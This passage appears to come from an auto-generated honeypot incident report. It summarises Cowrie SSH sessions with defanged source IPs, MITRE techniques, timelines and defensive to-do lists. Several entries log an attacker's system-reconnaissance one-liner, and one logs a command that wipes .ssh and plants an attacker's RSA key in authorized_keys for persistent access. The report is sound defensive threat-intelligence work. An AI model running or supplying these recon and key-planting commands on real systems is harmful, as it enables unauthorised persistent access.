|---|---|
| `2026-08-29 11:34:08` | `cowrie.session.connect` |
| `2026-08-29 11:34:08` | `cowrie.client.version` |
| `2026-08-29 11:34:08` | `cowrie.client.kex` |
| `2026-08-29 11:34:10` | `cowrie.login.success` |
| `2026-08-29 11:34:10` | `cowrie.direct-tcpip.request` |
| `2026-08-29 11:34:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.72.168[.]178` to AbuseIPDB if not already reported
- [ ] Block `78.72.168[.]178` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c7175198eaa

| Field | Detail |
|---|---|
| **Source IP** | `210.0.90[.]81` |
| **First Seen** | 2026-08-29 11:34 |
| **Last Seen** | 2026-08-29 11:34 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:34:15` | `cowrie.session.connect` |
| `2026-08-29 11:34:16` | `cowrie.client.version` |
| `2026-08-29 11:34:16` | `cowrie.client.kex` |
| `2026-08-29 11:34:19` | `cowrie.login.success` |
| `2026-08-29 11:34:19` | `cowrie.direct-tcpip.request` |
| `2026-08-29 11:34:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.0.90[.]81` to AbuseIPDB if not already reported
- [ ] Block `210.0.90[.]81` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-369d5a17a0f8

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-29 11:34 |
| **Last Seen** | 2026-08-29 11:35 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:34:58` | `cowrie.session.connect` |
| `2026-08-29 11:34:58` | `cowrie.client.version` |
| `2026-08-29 11:34:58` | `cowrie.client.kex` |
| `2026-08-29 11:34:59` | `cowrie.login.success` |
| `2026-08-29 11:35:00` | `cowrie.session.params` |
| `2026-08-29 11:35:00` | `cowrie.command.input` |
| `2026-08-29 11:35:00` | `cowrie.command.input` |
| `2026-08-29 11:35:00` | `cowrie.command.input` |
| `2026-08-29 11:35:00` | `cowrie.command.input` |
| `2026-08-29 11:35:00` | `cowrie.command.input` |
| `2026-08-29 11:35:00` | `cowrie.command.success` |
| `2026-08-29 11:35:00` | `cowrie.command.input` |
| `2026-08-29 11:35:00` | `cowrie.command.input` |
| `2026-08-29 11:35:00` | `cowrie.command.input` |
| `2026-08-29 11:35:00` | `cowrie.command.input` |
| `2026-08-29 11:35:00` | `cowrie.log.closed` |
| `2026-08-29 11:35:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4eb9e778422c

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 11:35 |
| **Last Seen** | 2026-08-29 11:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:35:14` | `cowrie.session.connect` |
| `2026-08-29 11:35:14` | `cowrie.client.version` |
| `2026-08-29 11:35:14` | `cowrie.client.kex` |
| `2026-08-29 11:35:15` | `cowrie.login.success` |
| `2026-08-29 11:35:15` | `cowrie.direct-tcpip.request` |
| `2026-08-29 11:35:15` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 11:35:15` | `cowrie.direct-tcpip.data` |
| `2026-08-29 11:35:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b18d552adfe

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-29 11:36 |
| **Last Seen** | 2026-08-29 11:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:36:07` | `cowrie.session.connect` |
| `2026-08-29 11:36:07` | `cowrie.client.version` |
| `2026-08-29 11:36:07` | `cowrie.client.kex` |
| `2026-08-29 11:36:08` | `cowrie.login.success` |
| `2026-08-29 11:36:09` | `cowrie.session.params` |
| `2026-08-29 11:36:09` | `cowrie.command.input` |
| `2026-08-29 11:36:09` | `cowrie.command.input` |
| `2026-08-29 11:36:09` | `cowrie.command.input` |
| `2026-08-29 11:36:09` | `cowrie.command.input` |
| `2026-08-29 11:36:09` | `cowrie.command.input` |
| `2026-08-29 11:36:09` | `cowrie.command.success` |
| `2026-08-29 11:36:09` | `cowrie.command.input` |
| `2026-08-29 11:36:09` | `cowrie.command.input` |
| `2026-08-29 11:36:09` | `cowrie.command.input` |
| `2026-08-29 11:36:09` | `cowrie.command.input` |
| `2026-08-29 11:36:09` | `cowrie.log.closed` |
| `2026-08-29 11:36:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b69a1c907c2

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-29 11:37 |
| **Last Seen** | 2026-08-29 11:37 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:37:20` | `cowrie.session.connect` |
| `2026-08-29 11:37:20` | `cowrie.client.version` |
| `2026-08-29 11:37:20` | `cowrie.client.kex` |
| `2026-08-29 11:37:20` | `cowrie.login.success` |
| `2026-08-29 11:37:21` | `cowrie.session.params` |
| `2026-08-29 11:37:21` | `cowrie.command.input` |
| `2026-08-29 11:37:21` | `cowrie.command.input` |
| `2026-08-29 11:37:21` | `cowrie.command.input` |
| `2026-08-29 11:37:21` | `cowrie.command.input` |
| `2026-08-29 11:37:21` | `cowrie.command.input` |
| `2026-08-29 11:37:21` | `cowrie.command.success` |
| `2026-08-29 11:37:21` | `cowrie.command.input` |
| `2026-08-29 11:37:21` | `cowrie.command.input` |
| `2026-08-29 11:37:21` | `cowrie.command.input` |
| `2026-08-29 11:37:21` | `cowrie.command.input` |
| `2026-08-29 11:37:22` | `cowrie.log.closed` |
| `2026-08-29 11:37:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e58b71fb46c1

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-29 11:38 |
| **Last Seen** | 2026-08-29 11:38 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:38:29` | `cowrie.session.connect` |
| `2026-08-29 11:38:29` | `cowrie.client.version` |
| `2026-08-29 11:38:30` | `cowrie.client.kex` |
| `2026-08-29 11:38:30` | `cowrie.login.success` |
| `2026-08-29 11:38:31` | `cowrie.session.params` |
| `2026-08-29 11:38:31` | `cowrie.command.input` |
| `2026-08-29 11:38:31` | `cowrie.command.input` |
| `2026-08-29 11:38:31` | `cowrie.command.input` |
| `2026-08-29 11:38:31` | `cowrie.command.input` |
| `2026-08-29 11:38:31` | `cowrie.command.input` |
| `2026-08-29 11:38:31` | `cowrie.command.success` |
| `2026-08-29 11:38:31` | `cowrie.command.input` |
| `2026-08-29 11:38:31` | `cowrie.command.input` |
| `2026-08-29 11:38:31` | `cowrie.command.input` |
| `2026-08-29 11:38:31` | `cowrie.command.input` |
| `2026-08-29 11:38:31` | `cowrie.log.closed` |
| `2026-08-29 11:38:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40bfb7e0e86f

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-29 11:39 |
| **Last Seen** | 2026-08-29 11:39 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:39:30` | `cowrie.session.connect` |
| `2026-08-29 11:39:30` | `cowrie.client.version` |
| `2026-08-29 11:39:31` | `cowrie.client.kex` |
| `2026-08-29 11:39:31` | `cowrie.login.success` |
| `2026-08-29 11:39:32` | `cowrie.session.params` |
| `2026-08-29 11:39:32` | `cowrie.command.input` |
| `2026-08-29 11:39:32` | `cowrie.command.input` |
| `2026-08-29 11:39:32` | `cowrie.command.input` |
| `2026-08-29 11:39:32` | `cowrie.command.input` |
| `2026-08-29 11:39:32` | `cowrie.command.input` |
| `2026-08-29 11:39:32` | `cowrie.command.success` |
| `2026-08-29 11:39:32` | `cowrie.command.input` |
| `2026-08-29 11:39:32` | `cowrie.command.input` |
| `2026-08-29 11:39:32` | `cowrie.command.input` |
| `2026-08-29 11:39:32` | `cowrie.command.input` |
| `2026-08-29 11:39:33` | `cowrie.log.closed` |
| `2026-08-29 11:39:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f2e478d63d3

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 11:39 |
| **Last Seen** | 2026-08-29 11:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:39:54` | `cowrie.session.connect` |
| `2026-08-29 11:39:54` | `cowrie.client.version` |
| `2026-08-29 11:39:55` | `cowrie.client.kex` |
| `2026-08-29 11:39:55` | `cowrie.login.success` |
| `2026-08-29 11:39:56` | `cowrie.direct-tcpip.request` |
| `2026-08-29 11:39:56` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 11:39:56` | `cowrie.direct-tcpip.data` |
| `2026-08-29 11:39:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8fbd6935a68

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-29 11:40 |
| **Last Seen** | 2026-08-29 11:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:40:31` | `cowrie.session.connect` |
| `2026-08-29 11:40:32` | `cowrie.client.version` |
| `2026-08-29 11:40:32` | `cowrie.client.kex` |
| `2026-08-29 11:40:32` | `cowrie.login.success` |
| `2026-08-29 11:40:33` | `cowrie.session.params` |
| `2026-08-29 11:40:33` | `cowrie.command.input` |
| `2026-08-29 11:40:33` | `cowrie.command.input` |
| `2026-08-29 11:40:33` | `cowrie.command.input` |
| `2026-08-29 11:40:33` | `cowrie.command.input` |
| `2026-08-29 11:40:33` | `cowrie.command.input` |
| `2026-08-29 11:40:33` | `cowrie.command.success` |
| `2026-08-29 11:40:33` | `cowrie.command.input` |
| `2026-08-29 11:40:33` | `cowrie.command.input` |
| `2026-08-29 11:40:33` | `cowrie.command.input` |
| `2026-08-29 11:40:33` | `cowrie.command.input` |
| `2026-08-29 11:40:34` | `cowrie.log.closed` |
| `2026-08-29 11:40:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23e246fb5d34

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-29 11:41 |
| **Last Seen** | 2026-08-29 11:41 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:41:32` | `cowrie.session.connect` |
| `2026-08-29 11:41:32` | `cowrie.client.version` |
| `2026-08-29 11:41:32` | `cowrie.client.kex` |
| `2026-08-29 11:41:33` | `cowrie.login.success` |
| `2026-08-29 11:41:34` | `cowrie.session.params` |
| `2026-08-29 11:41:34` | `cowrie.command.input` |
| `2026-08-29 11:41:34` | `cowrie.command.input` |
| `2026-08-29 11:41:34` | `cowrie.command.input` |
| `2026-08-29 11:41:34` | `cowrie.command.input` |
| `2026-08-29 11:41:34` | `cowrie.command.input` |
| `2026-08-29 11:41:34` | `cowrie.command.success` |
| `2026-08-29 11:41:34` | `cowrie.command.input` |
| `2026-08-29 11:41:34` | `cowrie.command.input` |
| `2026-08-29 11:41:34` | `cowrie.command.input` |
| `2026-08-29 11:41:34` | `cowrie.command.input` |
| `2026-08-29 11:41:34` | `cowrie.log.closed` |
| `2026-08-29 11:41:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa6102b3df03

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-29 11:42 |
| **Last Seen** | 2026-08-29 11:42 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:42:34` | `cowrie.session.connect` |
| `2026-08-29 11:42:34` | `cowrie.client.version` |
| `2026-08-29 11:42:34` | `cowrie.client.kex` |
| `2026-08-29 11:42:35` | `cowrie.login.success` |
| `2026-08-29 11:42:36` | `cowrie.session.params` |
| `2026-08-29 11:42:36` | `cowrie.command.input` |
| `2026-08-29 11:42:36` | `cowrie.command.input` |
| `2026-08-29 11:42:36` | `cowrie.command.input` |
| `2026-08-29 11:42:36` | `cowrie.command.input` |
| `2026-08-29 11:42:36` | `cowrie.command.input` |
| `2026-08-29 11:42:36` | `cowrie.command.success` |
| `2026-08-29 11:42:36` | `cowrie.command.input` |
| `2026-08-29 11:42:36` | `cowrie.command.input` |
| `2026-08-29 11:42:36` | `cowrie.command.input` |
| `2026-08-29 11:42:36` | `cowrie.command.input` |
| `2026-08-29 11:42:36` | `cowrie.log.closed` |
| `2026-08-29 11:42:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2044e4f908a1

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-29 11:43 |
| **Last Seen** | 2026-08-29 11:43 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:43:39` | `cowrie.session.connect` |
| `2026-08-29 11:43:40` | `cowrie.client.version` |
| `2026-08-29 11:43:40` | `cowrie.client.kex` |
| `2026-08-29 11:43:41` | `cowrie.login.success` |
| `2026-08-29 11:43:42` | `cowrie.session.params` |
| `2026-08-29 11:43:42` | `cowrie.command.input` |
| `2026-08-29 11:43:42` | `cowrie.command.input` |
| `2026-08-29 11:43:42` | `cowrie.command.input` |
| `2026-08-29 11:43:42` | `cowrie.command.input` |
| `2026-08-29 11:43:42` | `cowrie.command.input` |
| `2026-08-29 11:43:42` | `cowrie.command.success` |
| `2026-08-29 11:43:42` | `cowrie.command.input` |
| `2026-08-29 11:43:42` | `cowrie.command.input` |
| `2026-08-29 11:43:42` | `cowrie.command.input` |
| `2026-08-29 11:43:42` | `cowrie.command.input` |
| `2026-08-29 11:43:42` | `cowrie.log.closed` |
| `2026-08-29 11:43:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8fd4e39fed71

| Field | Detail |
|---|---|
| **Source IP** | `101.47.8[.]188` |
| **First Seen** | 2026-08-29 11:43 |
| **Last Seen** | 2026-08-29 11:44 |
| **Session Duration** | 29s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:43:42` | `cowrie.session.connect` |
| `2026-08-29 11:43:42` | `cowrie.client.version` |
| `2026-08-29 11:43:42` | `cowrie.client.kex` |
| `2026-08-29 11:43:43` | `cowrie.login.success` |
| `2026-08-29 11:43:44` | `cowrie.session.params` |
| `2026-08-29 11:43:44` | `cowrie.command.input` |
| `2026-08-29 11:43:44` | `cowrie.command.failed` |
| `2026-08-29 11:43:45` | `cowrie.log.closed` |
| `2026-08-29 11:43:46` | `cowrie.session.params` |
| `2026-08-29 11:43:46` | `cowrie.command.input` |
| `2026-08-29 11:43:46` | `cowrie.session.file_download` |
| `2026-08-29 11:43:46` | `cowrie.log.closed` |
| `2026-08-29 11:44:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.8[.]188` to AbuseIPDB if not already reported
- [ ] Block `101.47.8[.]188` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f6a94011e57

| Field | Detail |
|---|---|
| **Source IP** | `101.47.8[.]188` |
| **First Seen** | 2026-08-29 11:43 |
| **Last Seen** | 2026-08-29 11:44 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:43:57` | `cowrie.session.connect` |
| `2026-08-29 11:43:57` | `cowrie.client.version` |
| `2026-08-29 11:43:58` | `cowrie.client.kex` |
